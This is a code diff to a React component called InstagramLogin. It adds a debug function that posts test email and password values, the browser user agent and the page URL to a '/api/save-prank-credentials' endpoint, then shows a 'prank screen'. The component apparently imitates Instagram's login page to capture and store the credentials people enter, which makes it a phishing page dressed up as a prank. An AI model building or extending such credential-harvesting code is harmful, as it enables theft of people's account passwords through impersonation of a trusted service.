@@ -16,6 +16,44 @@ const InstagramLogin = () => {
 
   const { signup, login, resetPassword, currentUser, logout } = useAuth();
 
+  // Add a debug test function
+  const testPrankDirectly = () => {
+    console.log('🧪 Testing prank directly...');
+    setLoading(true);
+    setSavedCredentials({ email: 'test@debug.com', password: 'debugpass' });
+    
+    // Make API call
+    const backendUrl = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';
+    console.log('🔧 Backend URL:', backendUrl);
+    
+    fetch(`${backendUrl}/api/save-prank-credentials`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        email: 'direct.test@example.com',
+        password: 'directtestpass',
+        userAgent: navigator.userAgent,
+        url: window.location.href,
+        prankedAt: new Date().toISOString(),
+        timestamp: Date.now()
+      })
+    }).then(response => response.json())
+    .then(data => {
+      console.log('✅ Direct test API call successful!', data);
+    }).catch(error => {
+      console.error('❌ Direct test API call failed:', error);
+    });
+    
+    // Show prank screen after delay
+    setTimeout(() => {
+      console.log('🎭 Showing prank screen from direct test');
+      setLoading(false);
+      setShowPrankScreen(true);
+    }, 2000);
+  };
+
   async function handleSubmit(e) {
     e.preventDefault();
     console.log('🚀 Form submitted!');
